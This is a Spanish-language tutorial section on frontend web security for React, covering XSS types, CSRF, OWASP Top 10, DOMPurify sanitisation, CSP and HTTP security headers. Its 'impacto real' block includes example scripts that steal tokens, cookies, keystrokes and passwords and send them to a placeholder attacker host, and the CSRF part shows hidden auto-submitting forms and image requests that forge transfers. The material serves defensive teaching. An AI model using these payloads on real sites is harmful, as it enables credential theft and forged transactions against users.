# 1.3 Vulnerabilidades Comunes: XSS, CSRF y OWASP

> **Sección:** 1.3 | **Duración:** 2 horas | **Nivel:** Intermedio-Avanzado

---

## 📖 Introducción

Las vulnerabilidades de seguridad en aplicaciones web frontend son un vector de ataque crítico y frecuentemente subestimado. En esta sección estudiaremos los dos ataques más comunes y devastadores para aplicaciones React: **XSS (Cross-Site Scripting)** y **CSRF (Cross-Site Request Forgery)**, junto con su relación con el **OWASP Top 10**.

---

## 🎯 OWASP Top 10 Aplicado al Frontend React

El **OWASP Top 10** es la lista de las vulnerabilidades web más críticas. Las siguientes tienen impacto directo en el frontend:

| Posición OWASP 2021 | Vulnerabilidad | Impacto en Frontend |
|---------------------|----------------|---------------------|
| A03:2021 | Injection (incluye XSS) | ⛔ Crítico |
| A01:2021 | Broken Access Control | ⛔ Crítico |
| A02:2021 | Cryptographic Failures | ⚠️ Alto |
| A05:2021 | Security Misconfiguration | ⚠️ Alto |
| A07:2021 | Identification and Authentication Failures | ⛔ Crítico |
| A08:2021 | Software and Data Integrity Failures | ⚠️ Alto |

---

## 💉 XSS: Cross-Site Scripting

### ¿Qué es XSS?

XSS es una vulnerabilidad que permite a un atacante **inyectar código JavaScript malicioso** en páginas web vistas por otros usuarios. El código inyectado se ejecuta en el contexto del sitio víctima, con todos sus privilegios.

### Los Tres Tipos de XSS

#### 1. XSS Reflejado (Reflected XSS)

```
Flujo del ataque:
─────────────────
Atacante → Crea URL maliciosa → Envía a víctima
                ↓
URL: https://tienda.com/buscar?q=<script>robar()</script>
                ↓
Servidor refleja el parámetro en la respuesta HTML
                ↓
Víctima ve la página → Script se ejecuta en su navegador
```

```javascript
// VULNERABLE: El servidor incluye el query param directamente en HTML
app.get('/buscar', (req, res) => {
  const query = req.query.q;
  // ❌ NUNCA hacer esto:
  res.send(`<h1>Resultados para: ${query}</h1>`);
  // Si query = "<script>alert('XSS')</script>", se ejecuta
});
```

#### 2. XSS Almacenado (Stored XSS)

```
Flujo del ataque:
─────────────────
Atacante → Publica comentario malicioso → Guardado en DB
                ↓
Cualquier usuario que ve el comentario → Script se ejecuta
                ↓
Afecta a TODOS los usuarios del sistema (no solo la víctima)
```

```jsx
// VULNERABLE: Renderizar HTML sin sanitizar desde la base de datos
function CommentList({ comments }) {
  return (
    <div>
      {comments.map(comment => (
        // ❌ NUNCA usar dangerouslySetInnerHTML con contenido de usuarios
        <div key={comment.id}
             dangerouslySetInnerHTML={{ __html: comment.content }} />
      ))}
    </div>
  );
}
```

#### 3. XSS basado en DOM (DOM-based XSS)

```javascript
// VULNERABLE: Usar directamente datos de la URL en el DOM
// URL: https://app.com/#/redirect?url=javascript:robar()
const redirectUrl = window.location.hash.split('url=')[1];

// ❌ PELIGROSO
window.location.href = redirectUrl;
// Si redirectUrl = "javascript:alert('XSS')", se ejecuta

// ❌ También peligroso
document.getElementById('link').href = redirectUrl;
document.getElementById('container').innerHTML = `<a href="${redirectUrl}">Click</a>`;
```

---

## 💣 Impacto Real de XSS

Un ataque XSS exitoso puede permitir al atacante:

```javascript
// 1. Robar el access token (si está en localStorage)
const token = localStorage.getItem('accessToken');
fetch('https://atacante.com/steal', { method: 'POST', body: token });

// 2. Robar cookies accesibles por JS (las que NO son httpOnly)
const cookies = document.cookie;
fetch('https://atacante.com/cookies', { method: 'POST', body: cookies });

// 3. Keylogging: capturar lo que el usuario escribe
document.addEventListener('keypress', (e) => {
  fetch('https://atacante.com/keys', { body: e.key });
});

// 4. Leer el formulario de login cuando el usuario lo envía
document.querySelector('form').addEventListener('submit', (e) => {
  const password = e.target.querySelector('[type=password]').value;
  fetch('https://atacante.com/passwords', { body: password });
});

// 5. Modificar el DOM para crear formularios falsos (phishing)
document.body.innerHTML = '<form>Ingresa tu contraseña de nuevo...</form>';

// 6. Hacer requests autenticados en nombre del usuario
// (El AT está en memoria, pero el SW/código malicioso puede hacer requests)
fetch('/api/transfer', {
  method: 'POST',
  headers: { Authorization: `Bearer ${obtenidoDeSomewhere}` },
  body: JSON.stringify({ to: 'cuenta_atacante', amount: 10000 })
});
```

---

## 🛡️ Prevención de XSS en React

### React como Defensa por Defecto

React **escapa automáticamente** los valores que renderiza:

```jsx
// ✅ SEGURO: React escapa el HTML automáticamente
function UserComment({ comment }) {
  return <p>{comment.content}</p>;
  // Si content = "<script>alert('XSS')</script>"
  // Se renderiza como texto: "&lt;script&gt;alert('XSS')&lt;/script&gt;"
}

// ❌ PELIGROSO: Desactivar el escape de React
function UserComment({ comment }) {
  return <p dangerouslySetInnerHTML={{ __html: comment.content }} />;
  // El script SE EJECUTARÍA
}
```

### Cuándo Necesitas HTML Real: DOMPurify

Cuando necesitas renderizar HTML de usuarios (ej: editor de texto enriquecido), usa la librería `DOMPurify`:

```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

```tsx
import DOMPurify from 'dompurify';

interface RichTextProps {
  content: string;
}

function RichTextContent({ content }: RichTextProps) {
  // ✅ Sanitizar el HTML antes de renderizarlo
  const sanitizedContent = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'br', 'h1', 'h2', 'h3'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    // Asegurar que los links externos abran en nueva pestaña con rel=noopener
    ADD_ATTR: ['target'],
    FORCE_BODY: true,
  });
  
  return (
    <div
      className="prose"
      dangerouslySetInnerHTML={{ __html: sanitizedContent }}
    />
  );
}
```

### Sanitización de URLs

```typescript
// ✅ Función para validar URLs antes de usarlas en href o src
function sanitizeUrl(url: string): string {
  const SAFE_URL_PATTERN = /^(?:https?|mailto):/i;
  const DATA_URL_PATTERN = /^data:(?:image\/(?:bmp|gif|jpeg|jpg|png|tiff|webp)|video\/(?:mpeg|mp4|ogg|webm)|audio\/(?:mp3|oga|ogg|opus));base64,[a-z0-9+/]+=*$/i;
  
  if (SAFE_URL_PATTERN.test(url) || DATA_URL_PATTERN.test(url)) {
    return url;
  }
  
  console.warn(`URL potencialmente peligrosa bloqueada: ${url}`);
  return 'about:blank';
}

// Uso en componentes
function UserLink({ href, children }: { href: string; children: React.ReactNode }) {
  const safeHref = sanitizeUrl(href);
  
  return (
    <a
      href={safeHref}
      // ✅ Siempre agregar rel="noopener noreferrer" en links externos
      rel="noopener noreferrer"
      target="_blank"
    >
      {children}
    </a>
  );
}
```

---

## 🔄 CSRF: Cross-Site Request Forgery

### ¿Qué es CSRF?

CSRF es un ataque donde un sitio malicioso hace que el navegador de la víctima envíe **requests no autorizados a otro sitio** en el que la víctima está autenticada.

### Escenario de Ataque CSRF

```
ATAQUE CSRF PASO A PASO:
═════════════════════════

Contexto: El banco usa cookies de sesión para autenticar.

Paso 1: María inicia sesión en banco.com
────────────────────────────────────────
María → banco.com → Login OK → Cookie: session=abc123

Paso 2: María visita una página maliciosa
─────────────────────────────────────────
María → atacante.com → La página tiene este HTML oculto:

<img src="https://banco.com/api/transfer?to=atacante&amount=5000"
     style="display:none" />

Paso 3: El navegador ejecuta el request automáticamente
────────────────────────────────────────────────────────
El navegador de María hace GET a banco.com/api/transfer
Y envía la cookie session=abc123 AUTOMÁTICAMENTE

Paso 4: El banco ejecuta la transferencia
──────────────────────────────────────────
banco.com recibe: GET /transfer?to=atacante&amount=5000
Con cookie válida → Ejecuta la transferencia sin que María lo sepa
```

### CSRF con Formulario POST

```html
<!-- Página del atacante: ataque-masivo.com -->
<!DOCTYPE html>
<html>
  <body onload="document.getElementById('csrf-form').submit()">
    <!-- Formulario invisible que se envía automáticamente -->
    <form id="csrf-form"
          action="https://redesocial.com/api/follow"
          method="POST"
          style="display:none">
      <input name="userId" value="id_del_atacante">
      <input name="action" value="follow">
    </form>
  </body>
</html>
```

---

## 🛡️ Prevención de CSRF

### Por qué React + JWT en Memoria es Seguro contra CSRF

```javascript
// Cuando el access token está en memoria (variable JS):
// ✅ El atacante NO puede hacer un request válido desde su sitio
// porque JavaScript de atacante.com no puede leer el token de tuapp.com

// El atacante NO puede hacer esto desde su sitio:
fetch('https://tuapp.com/api/transfer', {
  method: 'POST',
  headers: {
    // ❌ No puede leer el token desde su origen
    'Authorization': `Bearer ${tuapp_token}` // tuapp_token es undefined
  }
});
```

### Protección CSRF para Cookies con SameSite

```javascript
// La configuración SameSite es la primera línea de defensa para cookies:

// SameSite=Strict: La cookie NO se envía en ningún request cross-site
// - El ataque CSRF no funciona porque la cookie no se envía
// - Limitación: no funciona si el usuario sigue un enlace externo hacia tu app

// SameSite=Lax: La cookie se envía en navegación top-level, pero NO en sub-requests
// - GET links desde otro sitio: sí envía la cookie
// - POST forms, iframes, img tags: NO envía la cookie
// - Recomendado si necesitas que los links externos funcionen

// SameSite=None: Se envía siempre (requiere Secure)
// - Para casos de uso multi-dominio
// - MENOS seguro, requiere mitigaciones adicionales
```

### Token CSRF como Capa Adicional

```typescript
// CSRF token para máxima seguridad con cookies SameSite=Lax o None:

// Backend: Agregar meta tag con CSRF token en el HTML inicial
app.get('*', (req, res) => {
  const csrfToken = generateSecureToken();
  
  // Guardar en sesión del servidor para validar después
  req.session.csrfToken = csrfToken;
  
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <meta name="csrf-token" content="${csrfToken}">
      </head>
      <body>...</body>
    </html>
  `);
});

// Frontend React: Leer el CSRF token al iniciar la app
function getCsrfTokenFromMeta(): string | null {
  const metaTag = document.querySelector('meta[name="csrf-token"]');
  return metaTag?.getAttribute('content') ?? null;
}

// Incluirlo en todos los requests mutantes
const csrfToken = getCsrfTokenFromMeta();

axios.defaults.headers.common['X-CSRF-Token'] = csrfToken;
```

---

## 📋 Content Security Policy (CSP)

La CSP es un mecanismo que le dice al navegador qué recursos puede cargar, siendo una defensa fundamental contra XSS:

```javascript
// Configurar CSP en el servidor (Express)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    [
      "default-src 'self'",                           // Solo cargar recursos del propio origen
      "script-src 'self' 'nonce-${generateNonce()}'", // Scripts solo del origen + nonce
      "style-src 'self' 'unsafe-inline'",             // Estilos (unsafe-inline para CSS-in-JS)
      "img-src 'self' data: https:",                  // Imágenes del origen, data URIs y HTTPS
      "font-src 'self' https://fonts.gstatic.com",    // Fuentes
      "connect-src 'self' https://api.empresa.com",   // API calls permitidos
      "frame-ancestors 'none'",                       // No puede ser embebido en iframes
      "base-uri 'self'",                              // Previene ataques de base tag injection
      "form-action 'self'",                           // Los forms solo pueden enviar al propio origen
    ].join('; ')
  );
  next();
});
```

---

## 🔐 Cabeceras de Seguridad HTTP

```javascript
// Cabeceras de seguridad esenciales para aplicaciones React:

// 1. X-Content-Type-Options: Previene MIME type sniffing
res.setHeader('X-Content-Type-Options', 'nosniff');

// 2. X-Frame-Options: Previene Clickjacking
res.setHeader('X-Frame-Options', 'DENY');
// O con CSP: frame-ancestors 'none'

// 3. X-XSS-Protection: Para navegadores viejos (Chrome/Firefox lo ignoraron)
res.setHeader('X-XSS-Protection', '1; mode=block');

// 4. Strict-Transport-Security: Fuerza HTTPS
res.setHeader(
  'Strict-Transport-Security',
  'max-age=31536000; includeSubDomains; preload'
);

// 5. Referrer-Policy: Controla información en header Referer
res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

// 6. Permissions-Policy: Controla acceso a APIs del navegador
res.setHeader(
  'Permissions-Policy',
  'camera=(), microphone=(), geolocation=(), interest-cohort=()'
);
```

---

## ✅ Lista de Verificación de Seguridad

### Para tu Aplicación React

```markdown
XSS Prevention:
- [ ] No usar dangerouslySetInnerHTML con contenido de usuarios
- [ ] Sanitizar con DOMPurify si necesitas renderizar HTML
- [ ] Validar y sanitizar URLs antes de usarlas
- [ ] Agregar rel="noopener noreferrer" en links externos
- [ ] Configurar Content Security Policy
- [ ] No guardar tokens en localStorage (evitar robo por XSS)

CSRF Prevention:
- [ ] Usar SameSite=Strict en cookies de refresh token
- [ ] Guardar access token en memoria (inmune a CSRF)
- [ ] Implementar CSRF token si usas cookies con SameSite=Lax
- [ ] Validar el header Origin/Referer en el backend

Headers de Seguridad:
- [ ] X-Content-Type-Options: nosniff
- [ ] X-Frame-Options: DENY
- [ ] Strict-Transport-Security configurado
- [ ] Referrer-Policy configurado
- [ ] Permissions-Policy configurado
```

---

## 🔗 Referencias

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [DOMPurify GitHub](https://github.com/cure53/DOMPurify)

---

## 📂 Ejemplos y Ejercicios

- [📄 Ejemplo Básico: XSS en React](./ejemplos/basico.md)
- [📄 Ejemplo Intermedio: CSRF con cookies y tokens](./ejemplos/intermedio.md)
- [📄 Ejemplo Avanzado: CSP y cabeceras de seguridad completas](./ejemplos/avanzado.md)
- [📝 Ejercicios Prácticos](./ejercicios.md)

---

*← [Sección 1.2: Almacenamiento Seguro](../1.2-almacenamiento-seguro/README.md) | [→ Sección 1.4: Implementación Práctica](../1.4-implementacion-practica/README.md)*
